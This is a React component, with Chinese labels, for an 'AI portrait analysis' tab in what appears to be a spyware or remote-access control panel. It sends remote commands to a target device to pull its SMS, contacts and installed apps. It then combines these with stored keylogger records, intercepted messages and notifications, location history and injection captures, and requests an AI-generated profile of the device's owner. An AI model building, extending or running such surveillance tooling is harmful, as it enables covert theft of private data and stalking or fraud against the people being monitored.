/**
 * AiAnalysisTab — AI 智能人像分析
 * 基于设备已采集的数据进行 AI 画像分析
 */
import { useState, useEffect, useCallback, useRef } from 'react'
import { api } from '../../api/client'
import { toast, centerToast } from '../../utils/toast'

const DATA_SOURCES = [
  { id: 'db', label: '数据库记录', icon: '🗄️', desc: '键盘记录、拦截短信/通知、定位历史、注入捕获', always: true, cmd: null },
  { id: 'sms', label: '短信记录', icon: '✉️', desc: '设备短信收发记录', cmd: 'SMS_READ', params: { limit: 9999 } },
  { id: 'contacts', label: '通讯录', icon: '👥', desc: '联系人列表', cmd: 'GET_CONTACTS', params: { limit: 500 } },
  { id: 'apps', label: '应用列表', icon: '📱', desc: '已安装应用', cmd: 'GET_APP_LIST', params: {} },
  { id: 'accounts', label: '账户信息', icon: '👤', desc: '设备账户（数据库已有）', always: true, cmd: null },
]

export default function AiAnalysisTab({ resolvedDeviceId, sendWs, addLog, smsList, contactsList, appList }) {
  const [sources, setSources] = useState(() => DATA_SOURCES.reduce((acc, s) => ({ ...acc, [s.id]: true }), {}))
  const [analyzing, setAnalyzing] = useState(false)
  const [fetchingAll, setFetchingAll] = useState(false)
  const [currentFetchIdx, setCurrentFetchIdx] = useState(-1)
  const [result, setResult] = useState('')
  const [reportTime, setReportTime] = useState(null)
  const [dataCounts, setDataCounts] = useState({})
  const fetchAbortRef = useRef(false)

  // 从 AI 数据缓存表 API 获取各数据源的统计 + 报告
  const loadDataCounts = useCallback(async () => {
    try {
      const [aiDataRes, logsRes] = await Promise.all([
        api.request(`/api/ai/device-data/${encodeURIComponent(resolvedDeviceId)}`).catch(() => null),
        api.request(`/api/logs?deviceId=${encodeURIComponent(resolvedDeviceId)}&page=1&pageSize=1`).catch(() => null),
      ])
      const aiData = aiDataRes?.data || {}
      setDataCounts(prev => {
        const counts = { ...prev }
        if (aiData.sms) { counts.sms = aiData.sms.count; counts.sms_time = aiData.sms.updated_at }
        if (aiData.contacts) { counts.contacts = aiData.contacts.count; counts.contacts_time = aiData.contacts.updated_at }
        if (aiData.apps) { counts.apps = aiData.apps.count; counts.apps_time = aiData.apps.updated_at }
        if (logsRes) counts.db = logsRes?.total || logsRes?.data?.total || 0
        counts.accounts = 1
        // 计算最后获取时间（取所有数据源中最新的 updated_at）
        const times = [aiData.sms?.updated_at, aiData.contacts?.updated_at, aiData.apps?.updated_at].filter(Boolean)
        counts._lastFetchTime = times.length > 0 ? times.sort().reverse()[0] : null
        return counts
      })
      // 加载已有报告
      if (aiDataRes?.report) {
        setResult(aiDataRes.report)
      }
    } catch {}
  }, [resolvedDeviceId])

  useEffect(() => { loadDataCounts() }, [loadDataCounts])

  // 外部传入的列表数据更新计数
  useEffect(() => {
    setDataCounts(prev => {
      const counts = { ...prev }
      if (smsList?.length) counts.sms = smsList.length
      if (contactsList?.length) counts.contacts = contactsList.length
      if (appList?.length) counts.apps = appList.length
      return counts
    })
  }, [smsList, contactsList, appList])

  const toggleSource = (id) => {
    setSources(prev => ({ ...prev, [id]: !prev[id] }))
  }

  // 一键顺序获取：一个获取成功后再获取下一个
  const fetchAllSequential = useCallback(() => {
    const fetchableSources = DATA_SOURCES.filter(s => s.cmd)
    if (fetchableSources.length === 0) return

    setFetchingAll(true)
    setCurrentFetchIdx(0)
    fetchAbortRef.current = false

    const fetchNext = (idx) => {
      if (idx >= fetchableSources.length || fetchAbortRef.current) {
        setFetchingAll(false)
        setCurrentFetchIdx(-1)
        if (!fetchAbortRef.current) {
          centerToast('全部数据获取完成')
          addLog('AI分析: 全部数据获取完成')
          // 最终刷新一次计数
          setTimeout(() => loadDataCounts(), 2000)
        }
        return
      }

      const src = fetchableSources[idx]
      setCurrentFetchIdx(idx)
      addLog(`AI分析: 正在获取 ${src.label}...`)

      sendWs({ type: 'command', sessionId: resolvedDeviceId, data: { command: src.cmd, params: src.params || {} } })

      // 每个命令等待8秒，期间每3秒刷新一次状态
      let pollCount = 0
      const pollTimer = setInterval(() => {
        pollCount++
        loadDataCounts()
        if (pollCount >= 2) clearInterval(pollTimer)
      }, 3000)

      setTimeout(() => {
        clearInterval(pollTimer)
        loadDataCounts()
        fetchNext(idx + 1)
      }, 8000)
    }

    fetchNext(0)
  }, [resolvedDeviceId, sendWs, addLog, loadDataCounts])

  // 停止获取
  const stopFetch = () => {
    fetchAbortRef.current = true
    setFetchingAll(false)
    setCurrentFetchIdx(-1)
    centerToast('已停止获取')
  }

  // 开始 AI 分析
  const startAnalysis = useCallback(async () => {
    setAnalyzing(true)
    setResult('')
    try {
      const selectedSources = Object.entries(sources).filter(([, v]) => v).map(([k]) => k)
      const res = await api.request('/api/ai/analyze', {
        method: 'POST',
        body: JSON.stringify({
          deviceId: resolvedDeviceId,
          sources: selectedSources,
        })
      })
      const report = res?.data?.report || res?.report || res?.result || res?.data || res?.message || ''
      setResult(typeof report === 'string' ? report : JSON.stringify(report, null, 2))
      addLog('AI分析: 报告已生成')
      centerToast('AI 分析完成')
    } catch (e) {
      setResult(`分析失败: ${e.message}\n\n请确认后端已实现 /api/ai/analyze 接口`)
      toast('AI 分析失败: ' + e.message, 'error')
    } finally {
      setAnalyzing(false)
    }
  }, [resolvedDeviceId, sources, addLog])

  // 获取数据源的状态标签
  const getSourceStatus = (src, idx) => {
    const fetchableSources = DATA_SOURCES.filter(s => s.cmd)
    const fetchableIdx = fetchableSources.indexOf(src)

    if (fetchingAll && fetchableIdx === currentFetchIdx) return { text: '⏳ 获取中...', color: '#fbbf24' }
    if (fetchingAll && fetchableIdx > currentFetchIdx && fetchableIdx >= 0) return { text: '等待中', color: '#64748b' }

    const count = dataCounts[src.id]
    if (count && count > 0) return { text: `已获取(${count}条)`, color: '#52c41a' }
    if (count === -1) return { text: '已请求', color: '#3b82f6' }
    if (src.always) return { text: '✓ 自动', color: '#52c41a' }
    return { text: '未获取', color: '#64748b' }
  }

  return (
    <div className="ctrl-tab-content">
      <div className="ctrl-tab-panel">
        {/* 标题说明 */}
        <div style={{ padding: '14px 16px', background: 'rgba(255,255,255,.03)', borderRadius: 12, border: '1px solid rgba(255,255,255,.08)', marginBottom: 12 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 8 }}>
            <div style={{ width: 4, height: 18, background: '#a855f7', borderRadius: 2 }} />
            <span style={{ fontSize: 15, fontWeight: 600, color: '#fff' }}>🤖 AI 智能人像分析</span>
          </div>
          <div style={{ fontSize: 12, color: '#94a3b8', lineHeight: 1.6 }}>
            基于设备已采集的数据（短信、通讯录、应用、键盘记录、定位、注入数据等），使用 AI 进行智能人像画像分析。建议先获取尽可能多的数据以提高分析准确度。
          </div>
        </div>

        {/* 数据源选择 */}
        <div style={{ padding: 16, background: 'rgba(255,255,255,.03)', borderRadius: 12, border: '1px solid rgba(255,255,255,.08)', marginBottom: 12 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 12 }}>
            <div style={{ width: 4, height: 18, background: '#3b82f6', borderRadius: 2 }} />
            <span style={{ fontSize: 13, fontWeight: 500, color: '#fff' }}>🗄️ 数据源（已勾选项将纳入分析）</span>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(280px, 1fr))', gap: 8 }}>
            {DATA_SOURCES.map((src, idx) => {
              const status = getSourceStatus(src, idx)
              return (
                <div
                  key={src.id}
                  style={{
                    display: 'flex', alignItems: 'center', gap: 8, padding: '10px 12px',
                    background: sources[src.id] ? 'rgba(59,130,246,.08)' : 'rgba(255,255,255,.02)',
                    border: `1px solid ${sources[src.id] ? 'rgba(59,130,246,.3)' : 'rgba(255,255,255,.06)'}`,
                    borderRadius: 8, transition: 'all .15s'
                  }}
                >
                  <input
                    type="checkbox"
                    checked={sources[src.id]}
                    disabled={src.always}
                    onChange={() => !src.always && toggleSource(src.id)}
                    style={{ marginTop: 0, accentColor: '#3b82f6', flexShrink: 0 }}
                  />
                  <div style={{ flex: 1, minWidth: 0 }}>
                    <div style={{ fontSize: 12, fontWeight: 600, color: '#e2e8f0', display: 'flex', alignItems: 'center', gap: 6 }}>
                      {src.icon} {src.label}
                      <span style={{ fontSize: 10, color: status.color, fontWeight: 500, marginLeft: 'auto' }}>{status.text}</span>
                    </div>
                    <div style={{ fontSize: 10, color: '#64748b', marginTop: 2 }}>{src.desc}</div>
                  </div>
                </div>
              )
            })}
          </div>
        </div>

        {/* 操作按钮 */}
        <div style={{ display: 'flex', gap: 10, marginBottom: 12, flexWrap: 'wrap' }}>
          <button
            onClick={startAnalysis}
            disabled={analyzing}
            style={{
              padding: '10px 20px', fontSize: 13, fontWeight: 700, borderRadius: 8, border: 'none',
              background: analyzing ? 'rgba(168,85,247,.3)' : 'linear-gradient(135deg, #a855f7, #7c3aed)',
              color: '#fff', cursor: analyzing ? 'wait' : 'pointer', display: 'flex', alignItems: 'center', gap: 6
            }}
          >
            {analyzing ? '⏳ 分析中...' : '🤖 开始 AI 分析'}
          </button>
          {fetchingAll ? (
            <button
              onClick={stopFetch}
              style={{
                padding: '10px 20px', fontSize: 13, fontWeight: 600, borderRadius: 8, border: 'none',
                background: 'linear-gradient(135deg, #ef4444, #dc2626)',
                color: '#fff', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: 6
              }}
            >
              ⏹ 停止获取
            </button>
          ) : (
            <button
              onClick={fetchAllSequential}
              style={{
                padding: '10px 20px', fontSize: 13, fontWeight: 600, borderRadius: 8, border: 'none',
                background: 'linear-gradient(135deg, #1890ff, #096dd9)',
                color: '#fff', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: 6
              }}
            >
              📥 一键获取全部数据
            </button>
          )}
          <button
            onClick={loadDataCounts}
            style={{
              padding: '10px 20px', fontSize: 13, fontWeight: 600, borderRadius: 8,
              border: '1px solid rgba(255,255,255,.1)', background: 'rgba(255,255,255,.05)',
              color: '#94a3b8', cursor: 'pointer'
            }}
          >
            🔄 刷新状态</button>
          {dataCounts._lastFetchTime && <span style={{ fontSize: 11, color: "#64748b", alignSelf: "center" }}>上次获取: {dataCounts._lastFetchTime}</span>}
          {result && (
            <button
              onClick={() => setResult('')}
              style={{
                padding: '10px 20px', fontSize: 13, fontWeight: 600, borderRadius: 8,
                border: '1px solid rgba(239,68,68,.2)', background: 'rgba(239,68,68,.05)',
                color: '#f87171', cursor: 'pointer'
              }}
            >
              🗑️ 清除报告
            </button>
          )}
        </div>

        {/* 获取进度提示 */}
        {fetchingAll && (
          <div style={{ padding: '10px 14px', background: 'rgba(251,191,36,.08)', border: '1px solid rgba(251,191,36,.2)', borderRadius: 8, marginBottom: 12, fontSize: 12, color: '#fbbf24' }}>
            ⏳ 正在顺序获取数据... 当前: {DATA_SOURCES.filter(s => s.cmd)[currentFetchIdx]?.label || ''}（{currentFetchIdx + 1}/{DATA_SOURCES.filter(s => s.cmd).length}）
          </div>
        )}

        {/* 分析结果 */}
        {result && (
          <div style={{ padding: 16, background: 'rgba(255,255,255,.03)', borderRadius: 12, border: '1px solid rgba(168,85,247,.3)' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 12 }}>
              <div style={{ width: 4, height: 18, background: '#a855f7', borderRadius: 2 }} />
              <span style={{ fontSize: 13, fontWeight: 500, color: '#a855f7' }}>📊 分析报告</span>
              {reportTime && <span style={{ fontSize: 10, color: "#64748b", marginLeft: 8 }}>分析时间: {reportTime}</span>}
            </div>
            <div style={{
              fontSize: 13, color: '#e2e8f0', lineHeight: 1.8, whiteSpace: 'pre-wrap',
              maxHeight: 500, overflow: 'auto', padding: 12,
              background: 'rgba(0,0,0,.2)', borderRadius: 8, fontFamily: 'system-ui'
            }}>
              {result}
            </div>
          </div>
        )}
      </div>
    </div>
  )
}
